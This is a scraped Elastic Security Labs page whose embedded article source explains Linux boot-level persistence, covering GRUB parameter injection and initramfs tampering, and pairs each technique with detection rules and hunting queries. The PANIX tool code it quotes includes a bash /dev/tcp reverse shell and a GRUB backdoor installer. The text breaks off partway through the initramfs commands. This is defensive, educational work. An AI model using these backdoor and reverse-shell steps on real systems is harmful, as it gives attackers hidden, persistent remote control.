<p>By combining the <a href="https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_network_manager_dispatcher_script.toml">Persistence via NetworkManager Dispatcher Script</a> hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to <a href="https://attack.mitre.org/techniques/T1546/">T1546</a>.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="conclusion" class="absolute -top-32"></span>Conclusion</h1>
<p>In the fifth and concluding chapter of the &quot;Linux Detection Engineering&quot; series, we turned our attention to persistence mechanisms rooted in the Linux boot process, authentication systems, inter-process communication, and core utilities. We began with GRUB-based persistence and the manipulation of initramfs, covering both manual approaches and automated methods using Dracut. Moving further, we explored Polkit-based persistence, followed by a dive into D-Bus exploitation, and concluded with NetworkManager dispatcher scripts, highlighting their potential for abuse in persistence scenarios.</p>
<p>Throughout this series, <a href="https://github.com/Aegrah/PANIX">PANIX</a> played a critical role in demonstrating and simulating these techniques, allowing you to test your detection capabilities and strengthen your defenses. Combined with the tailored ES|QL and OSQuery queries provided, these tools enable you to identify and respond effectively to even the most advanced persistence mechanisms.</p>
<p>As we close this series, we hope you feel empowered to tackle Linux persistence threats with confidence. Armed with practical knowledge, actionable strategies, and hands-on experience, you are well-prepared to defend against adversaries targeting Linux environments. Thank you for joining us, and as always, stay vigilant and happy hunting!</p></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=Linux Detection Engineering - The Grand Finale on Linux Persistence&amp;url=https://www.elastic.co/security-labs/the-grand-finale-on-linux-persistence" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/the-grand-finale-on-linux-persistence" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/the-grand-finale-on-linux-persistence&amp;title=Linux Detection Engineering - The Grand Finale on Linux Persistence" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/the-grand-finale-on-linux-persistence&amp;title=Linux Detection Engineering - The Grand Finale on Linux Persistence" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2025<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"Linux Detection Engineering - The Grand Finale on Linux Persistence","slug":"the-grand-finale-on-linux-persistence","date":"2025-02-27","description":"By the end of this series, you'll have a robust knowledge of both common and rare Linux persistence techniques; and you'll understand how to effectively engineer detections for common and advanced adversary capabilities.","image":"Security Labs Images 5.jpg","subtitle":"Building on previous research, this article describes creative, complex, or rare persistence techniques.","body":{"raw":"\n# Introduction\nWelcome to the grand finale of the “Linux Persistence Detection Engineering” series! In this fifth and final part, we continue to dig deep into the world of Linux persistence. Building on the foundational concepts and techniques explored in the previous publications, this post discusses some more obscure, creative and/or complex backdoors and persistence mechanisms.\n\n\n\nIf you missed the earlier articles, they lay the groundwork by exploring key persistence concepts. You can catch up on them here:\n\n* [*Linux Detection Engineering - A Primer on Persistence Mechanisms*](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms)  \n* [*Linux Detection Engineering - A Sequel on Persistence Mechanisms*](https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms)  \n* [*Linux Detection Engineering - A Continuation on Persistence Mechanisms*](https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms)  \n* [*Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms*](https://www.elastic.co/security-labs/approaching-the-summit-on-persistence)\n\nIn this publication, we’ll provide insights into these persistence mechanisms by showcasing:\n\n* How each works (theory)  \n* How to set each up (practice)  \n* How to detect them (SIEM and Endpoint rules)  \n* How to hunt for them (ES|QL and OSQuery reference hunts)\n\nTo make the process even more engaging, we will be leveraging [PANIX](https://github.com/Aegrah/PANIX), a custom-built Linux persistence tool designed by Ruben Groenewoud of Elastic Security. PANIX allows you to streamline and experiment with Linux persistence setups, making it easy to identify and test detection opportunities.\n\nBy the end of this series, you'll have a robust knowledge of both common and rare Linux persistence techniques; and you'll understand how to effectively engineer detections for common and advanced adversary capabilities. Are you ready to uncover the final pieces of the Linux persistence puzzle? Let’s dive in!\n\n# Setup note\n\nTo ensure you are prepared to detect the persistence mechanisms discussed in this article, it is important to [enable and update our pre-built detection rules](https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules). If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and potentially fill any gaps. Now, we are ready to get started.\n\n# T1542 - Pre-OS Boot: GRUB Bootloader \n\n[GRUB (GRand Unified Bootloader)](https://www.gnu.org/software/grub/manual/grub/grub.html) is a widely used bootloader in Linux systems, responsible for loading the kernel and initializing the operating system. GRUB provides a flexible framework that supports various configurations, making it a powerful tool for managing the boot process. It acts as an intermediary between the system firmware ([BIOS](https://en.wikipedia.org/wiki/BIOS)/[UEFI](https://en.wikipedia.org/wiki/UEFI)) and the operating system. When a Linux system is powered on, the following sequence typically occurs:\n\n1. ### **System Firmware**\n\n* BIOS or UEFI initializes hardware components (e.g., CPU, RAM, storage devices) and performs a POST (Power-On Self-Test).  \n* It then locates the bootloader on the designated boot device (usually based on boot priority settings).\n\n2. ### **GRUB Bootloader**\n\n* GRUB is loaded into memory.  \n* It displays a menu (if enabled) that allows users to select an operating system, kernel version, or recovery mode.  \n* GRUB loads the kernel image (`vmlinuz`) into memory, as well as the initramfs/initrd image (`initrd.img`), which is a temporary root filesystem used for initial system setup (e.g., loading kernel modules for filesystems and hardware).  \n* GRUB passes kernel parameters (e.g., the location of the root filesystem, boot options) and hands over control to the kernel.\n\n3. ### **Kernel Execution**\n\n* The kernel is unpacked and initialized. It begins detecting and initializing system hardware.  \n* The kernel mounts the root filesystem specified in the kernel parameters.  \n* It starts the init system (traditionally `init`, now often `systemd`), which is the first process (`PID 1`) that initializes and manages the user space.  \n* The `init` system sets up services, mounts filesystems, and spawns user sessions.\n\nGRUB’s configuration system is flexible and modular, enabling administrators to define bootloader behavior, kernel parameters, and menu entries. All major distributions use `/etc/default/grub` as the primary configuration file for GRUB. This file contains high-level options, such as default kernel parameters, boot timeout, and graphical settings. For example:\n\n```\nGRUB_TIMEOUT=5                       # Timeout in seconds for the GRUB menu\nGRUB_DEFAULT=0                       # Default menu entry to boot\nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash resume=/dev/sda2\" # Common kernel parameters\nGRUB_CMDLINE_LINUX=\"init=/bin/bash audit=1\" # Additional kernel parameters\n```\n\nTo enhance flexibility, GRUB supports a modular approach to configuration through script directories. These are typically located in `/etc/default/grub.d/` (Ubuntu/Debian) and `/etc/grub.d/` (Fedora/CentOS/RHEL). The scripts in these directories are combined into the final configuration during the update process. \n\nPrior to boot, the GRUB bootloader must be compiled. The compiled GRUB configuration file is the final output used by the bootloader at runtime. It is generated from the settings in `/etc/default/grub` and the modular scripts in `/etc/grub.d/` (or similar directories and files for other distributions). This configuration is then stored in `/boot/grub/grub.cfg` for BIOS systems, and `/boot/efi/EFI/\u003cdistro\u003e/grub.cfg` for UEFI systems.\n\nOn Ubuntu and Debian-based systems, the `update-grub` command is used to generate the GRUB configuration. For Fedora, CentOS, and RHEL systems, the equivalent command is `grub2-mkconfig`. Upon generation of the configuration, the following events occur:\n\n1. **Scripts Execution**:  \n* All modular scripts in `/etc/default/grub.d/` or `/etc/grub.d/` are executed in numerical order.  \n2. **Settings Aggregation**:  \n* Parameters from `/etc/default/grub` and modular scripts are merged.  \n3. **Menu Entries Creation**:  \n* GRUB dynamically detects installed kernels and operating systems and creates corresponding menu entries.  \n4. **Final Compilation**:  \n* The combined configuration is written to `/boot/grub/grub.cfg` (or the UEFI equivalent path), ready to be used at the next boot.\n\nAttackers can exploit GRUB’s flexibility and early execution in the boot process to establish persistence. By modifying GRUB configuration files, they can inject malicious parameters or scripts that execute with root privileges before the operating system fully initializes. Attackers can:\n\n1. **Inject Malicious Kernel Parameters**:  \n* Adding parameters like `init=/payload.sh` in `/etc/default/grub` or directly in the GRUB menu at boot forces the kernel to execute a malicious script instead of the default `init` system.  \n2. **Modify Menu Entries**:  \n* Attackers can alter menu entries in `/etc/grub.d/` to include unauthorized commands or point to malicious kernels.  \n3. **Create Hidden Boot Entries**:  \n* Adding extra boot entries with malicious configurations that are not displayed in the GRUB menu.\n\nAs GRUB operates before the system’s typical EDR and other solution mechanisms are active, this technique is especially hard to detect. Additionally, knowledge scarcity around these types of attacks makes detection difficult, as malicious parameters or entries can appear similar to legitimate configurations, making manual inspection prone to oversight. \n\nGRUB manipulation falls under [T1542: Pre-OS Boot](https://attack.mitre.org/techniques/T1542/) in the MITRE ATT\u0026CK framework. This technique encompasses attacks targeting bootloaders to gain control before the operating system initializes. Despite its significance, there is currently no dedicated sub-technique for GRUB-specific attacks.\n\nIn the next section, we’ll explore how attackers can establish persistence through GRUB by injecting malicious parameters and modifying bootloader configurations.\n\n# Persistence through T1542 - Pre-OS Boot: GRUB Bootloader\n\nIn this section we will be looking at the technical details related to GRUB persistence. To accomplish this, we will be leveraging the [setup_grub.sh](https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_grub.sh) module from [PANIX](https://github.com/Aegrah/PANIX), a custom-built Linux persistence tool. By simulating this technique, we will be able to research potential detection opportunities.\n\nThe GRUB module detects the Linux distribution it is running on, and determines the correct files to modify, and support tools necessary to establish persistence. There is no compatibility built into PANIX for Fedora-based operating systems within this module, due to the restricted environment available within the boot process. PANIX determines whether the payload is already injected, and if not, creates a custom configuration (`cfg`) file containing the `init=/grub-panix.sh` parameter. GRUB configuration files are loaded in ascending order, based on the modules’ numeric prefix. To ensure the injected module is loaded last, the priority is set to 99.\n\n```\nlocal grub_custom_dir=\"/etc/default/grub.d\"\nlocal grub_custom_file=\"${grub_custom_dir}/99-panix.cfg\"\n\necho \"[*] Creating custom GRUB configuration file: $grub_custom_file\"\ncat \u003c\u003cEOF \u003e \"$grub_custom_file\"\n# Panix GRUB persistence configuration\nGRUB_CMDLINE_LINUX_DEFAULT=\"$GRUB_CMDLINE_LINUX_DEFAULT init=/grub-panix.sh\"\nEOF\n```\n\nAfter this configuration file is in place, the `/grub-panix.sh` script is created, containing a payload that sleeps for a certain amount of time (to ensure networking is available), after which it executes a reverse shell payload, detaching itself from its main process to ensure no hang ups.\n\n```\npayload=\"( sleep 10; nohup setsid bash -c 'bash -i \u003e\u0026 /dev/tcp/${ip}/${port} 0\u003e\u00261' \u0026 disown ) \u0026\"\n\nlocal init_script=\"/grub-panix.sh\"\necho \"[*] Creating backdoor init script at: $init_script\"\ncat \u003c\u003cEOF \u003e \"$init_script\"\n#!/bin/bash\n# Panix GRUB Persistence Backdoor (Ubuntu/Debian)\n(\n\techo \"[*] Panix backdoor payload will execute after 10 seconds delay.\"\n\t${payload}\n\techo \"[+] Panix payload executed.\"\n) \u0026\nexec /sbin/init\nEOF\n```\n\nAfter these files are in place, all that is left is to update GRUB to contain the embedded backdoor module by running `update-grub`.\n\nLet’s take a look at what this process looks like from a detection engineering perspective. Run the PANIX module through the following command:\n\n```\n\u003e sudo ./panix.sh --grub --default --ip 192.168.1.100 --port 2014\n[*] Creating backdoor init script at: /grub-panix.sh\n[+] Backdoor init script created and made executable.\n[*] Creating custom GRUB configuration file: /etc/default/grub.d/99-panix.cfg\n[+] Custom GRUB configuration file created.\n[*] Backing up /etc/default/grub to /etc/default/grub.bak...\n[+] Backup created at /etc/default/grub.bak\n[*] Running 'update-grub' to apply changes...\nSourcing file `/etc/default/grub'\nSourcing file `/etc/default/grub.d/99-panix.cfg'\nSourcing file `/etc/default/grub.d/init-select.cfg'\nGenerating grub configuration file ...\n[+] GRUB configuration updated. Reboot to activate the payload.\n```\n\nUpon execution of the module, and rebooting the machine, the following documents can be observed in Kibana:\n\n![PANIX GRUB module execution visualized in Kibana](/assets/images/the-grand-finale-on-linux-persistence/image3.png)\n\nUpon execution of PANIX, we can see a backup of `/etc/default/grub`, a new modular grub configuration, `/etc/default/grub.d/99-panix.cfg`, and the backdoor payload (`/grub-panix.sh`) being created. After granting the backdoor the necessary execution permissions, GRUB is updated through the `update-grub` executable, and the backdoor is now ready. Upon reboot, `/grub-panix.sh` is executed by `init`, which is `systemd` for most modern operating systems, successfully executing the reverse shell chain of `/grub-panix.sh` → `nohup` → `setsid` → `bash`. The reason its `event.action` value is `already-running`, is due to the payload being executed during the boot process, prior to the initialization of Elastic Defend. Depending on the boot stage of execution, Elastic Defend will be able to capture missed events with this `event.action`, allowing us to still detect the activity.\n\nLet’s take a look at the coverage:\n\n*Detection and endpoint rules that cover GRUB bootloader persistence*\n\n| Category | Coverage |\n| :---- | :---- |\n| File | [GRUB Configuration File Creation](https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_grub_configuration_creation.toml) |\n|      | [GRUB Configuration Generation through Built-in Utilities](https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_grub_makeconfig.toml) |\n|      | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/integrations/fim/persistence_suspicious_file_modifications.toml) |\n| Process | [Boot File Copy](https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_boot_file_copy.toml) |\n|         | [Systemd Shell Execution During Boot](https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_systemd_shell_execution.toml) |\n\nYou can revert the changes made by PANIX by running the following revert command:\n\n```\n\u003e ./panix.sh --revert grub\n\n[*] Reverting GRUB persistence modifications...\n[*] Restoring backup of /etc/default/grub from /etc/default/grub.bak...\n[+] /etc/default/grub restored.\n[*] Removing /etc/default/grub.d/99-panix.cfg...\n[+] /etc/default/grub.d/99-panix.cfg removed.\n[*] /grub-panix.sh not found; nothing to remove.\n[*] Updating GRUB configuration...\n[...]\n[+] GRUB configuration updated.\n[+] GRUB persistence reverted successfully.\n```\n\n# Hunting for T1542 - Pre-OS Boot: GRUB Bootloader \n\nOther than relying on detections, it is important to incorporate threat hunting into your workflow, especially for persistence mechanisms like these, where events can potentially be missed due to timing or environmental constraints. This publication lists the available hunts for GRUB bootloader persistence; however, more details regarding the basics of threat hunting are outlined in the  “*Hunting for T1053 - scheduled task/job*” section of “[*Linux Detection Engineering -  A primer on persistence mechanisms*](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms)”. Additionally, descriptions and references can be found in our [Detection Rules repository](https://github.com/elastic/detection-rules), specifically in the [Linux hunting subdirectory](https://github.com/elastic/detection-rules/tree/main/hunting).\n\nWe can hunt for GRUB bootloader persistence through [ES|QL](https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html) and [OSQuery](https://www.elastic.co/guide/en/kibana/current/osquery.html), focusing on file creations, modifications, and executions related to GRUB configurations. The approach includes monitoring for the following:\n\n1. **Creations and/or modifications to GRUB configuration files**: Tracks changes to critical files such as the GRUB configuration file and modules, and the compiled GRUB binary. These files are essential for bootloader configurations and are commonly targeted for GRUB-based persistence.  \n2. **Execution of GRUB-related commands**: Monitors for commands like `grub-mkconfig`, `grub2-mkconfig`, and `update-grub`, which may indicate attempts to modify GRUB settings or regenerate boot configurations.  \n3. **Metadata analysis of GRUB files**: Identifies ownership, access times, and recent changes to GRUB configuration files to detect unauthorized modifications.  \n4. **Kernel and Boot Integrity Monitoring**: Tracks critical kernel and boot-related data using ES|QL and OSQuery tables such as `secureboot`, `platform_info`, `kernel_info`, and `kernel_keys`, providing insights into the system’s boot integrity and kernel configurations.\n\nBy combining the [Persistence via GRUB Bootloader](https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_grub_bootloader.toml) and [General Kernel Manipulation](https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_general_kernel_manipulation.toml) hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to [T1542](https://attack.mitre.org/techniques/T1542/).\n\n# T1542- Pre-OS Boot: Initramfs\n\n[Initramfs (Initial RAM Filesystem)](https://wiki.debian.org/initramfs) is a vital part of the Linux boot process, acting as a temporary root filesystem loaded into memory by the bootloader. It enables the kernel to initialize hardware, load necessary modules, and prepare the system to mount the real root filesystem.\n\nAs we learnt in the previous section, the bootloader (e.g., GRUB) loads two key components: the kernel (`vmlinuz`) and the initramfs image (`initrd.img`). The `initrd.img` is a compressed filesystem, typically stored in `/boot/`, containing essential drivers, binaries (e.g. `busybox`), libraries, and scripts for early system initialization. Packed in formats like gzip, LZ4, or xz, it extracts into a minimal Linux filesystem with directories like `/bin`, `/lib`, and `/etc`. Once the real root filesystem is mounted, control passes to the primary `init` system (e.g., `systemd`), and the initramfs is discarded.\n\nInitramfs plays a central role in the Linux boot process, but it doesn't work in isolation. The `/boot/` directory houses essential files that enable the bootloader and kernel to function seamlessly. These files include the kernel binary, the initramfs image, and configuration data necessary for system initialization. Here's a breakdown of these critical components:\n\n* **vmlinuz-\\\u003cversion\\\u003e**: A compressed Linux kernel binary.  \n* **vmlinuz**: A symbolic link to the compressed Linux kernel binary.  \n* **initrd.img-\\\u003cversion\\\u003e** or **initramfs.img-\\\u003cversion\\\u003e**: The initramfs image containing the temporary filesystem.  \n* **initrd.img** or **initramfs.img**: A symbolic link to the initramfs image.  \n* **config-\\\u003cversion\\\u003e**: Configuration options for the specific kernel version.  \n* **System.map-\\\u003cversion\\\u003e**: Kernel symbol map used for debugging.  \n* **grub/**: Bootloader configuration files.\n\nSimilar to GRUB, initramfs is executed early in the boot process and therefore an interesting target for attackers seeking stealthy persistence. Modifying its contents—such as adding malicious scripts or altering initialization logic—enables execution of malicious code before the system fully initializes. \n\nWhile there is currently no specific subsection for initramfs, modification of the boot process falls under [T1542](https://attack.mitre.org/techniques/T1542/), *Pre-OS Boot* in the MITRE ATT\u0026CK framework. \n\nThe next section will explore how attackers might manipulate initramfs, the methods they could use to embed persistence mechanisms, and how to detect and mitigate these threats effectively.\n\n# T1542 - Initramfs: Manual Modifications\n\nModifying initramfs to establish persistence is a technique discussed in the “[*Initramfs Persistence Technique*](https://breachlabs.io/initramfs-persistence-technique)” blog published on [Breachlabs.io](https://breachlabs.io/). At its core, modifying initramfs involves unpacking its compressed filesystem, making changes, and repacking the image to maintain functionality while embedding persistence mechanisms. This process is not inherently malicious; administrators might modify initramfs to add custom drivers or configurations. However, attackers can exploit this flexibility to execute malicious actions before the primary operating system is fully loaded.\n\nAn example technique involves adding code to the `init` script to manipulate the host filesystem—such as creating a backdoor user, altering system files/services, or injecting scripts that persist across reboots.\n\nWhile there are helper tools for working with initramfs, manual modifications are possible through low-level utilities such as [binwalk](https://github.com/ReFirmLabs/binwalk). `Binwalk` is particularly useful for analyzing and extracting compressed archives, making it a good choice for inspecting and deconstructing the initramfs image. \n\nIn the following section, we’ll provide a detailed explanation of the manual initramfs modification process.\n\n# Persistence through T1542 - Initramfs: Manual Modifications\n\nIn this section we will be “manually” manipulating initramfs to add a backdoor onto the system during the boot process. To do so, we will use the [setup_initramfs.sh](https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_initramfs.sh) module from PANIX. Let’s analyze the most important aspects of the module to ensure we understand what is going on.\n\nUpon execution of the module, the `initrd.img` file is backed up, as implementing a technique like this may disrupt the boot process, and having a back up available is always recommended. Next, a temporary directory is created, and the initramfs image is copied there. Through `binwalk`, we can identify and map out the different embedded archives within the `initrd.img` (such as the CPU microcode `cpio` archive and the gzipped `cpio` archive containing the mini Linux filesystem). The string `TRAILER!!!` marks the end of a `cpio` archive, letting us know exactly where one archive finishes so we can separate it from the next. In other words, `binwalk` shows us where to split the file, and the `TRAILER!!!` marker confirms the boundary of the microcode `cpio` before we extract and rebuild the rest of the initramfs. For more detailed information, take a look at the original author’s “[*Initramfs Persistence Technique*](https://breachlabs.io/initramfs-persistence-technique)” blog.\n\n```\n# Use binwalk to determine the trailer address.\nADDRESS=$(binwalk initrd.img | grep TRAILER | tail -1 | awk '{print $1}')\nif [[ -z \"$ADDRESS\" ]]; then\n\techo \"Error: Could not determine trailer address using binwalk.\"\n\texit 1\nfi\necho \"[*] Trailer address: $ADDRESS\"\n```\n\nThis section extracts and unpacks parts of the `initrd.img` file for modification. The `dd` command extracts the first `cpio` archive (microcode) up to the byte offset marked by `TRAILER!!!`, saving it as `initrd.img-begin` for later reassembly. Next, `unmkinitramfs` unpacks the remaining filesystem from `initrd.img` into a directory (`initrd_extracted`), enabling modifications.\n\n```\ndd if=initrd.img of=initrd.img-begin count=$ADDRESS bs=1 2\u003e/dev/null || { echo \"Error: dd failed (begin)\"; exit 1; }\n\nunmkinitramfs initrd.img initrd_extracted || { echo \"Error: 